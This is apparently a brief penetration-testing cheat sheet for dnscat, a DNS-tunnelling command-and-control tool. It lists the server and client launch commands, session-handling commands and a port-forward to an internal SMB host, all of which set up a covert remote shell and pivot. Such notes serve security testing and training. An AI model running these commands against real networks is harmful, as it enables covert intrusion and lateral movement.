-----------------------------
ServerSide

dnscat-server <domain>

#After a connection is established.

- windows <--- Displays currents active sessions.
- windows -i 1 <--- Create a command session.
- ? <--- Displays commands available in a command session.
- <COMMAND> --help <--- Displays help for a command.

#For example; listen --help <--- displays help for create a forwarded connection. listen 127.0.0.1:4455 172.16.2.11:445

-----------------------------------------------

ClientSide

./dnscat <domain>
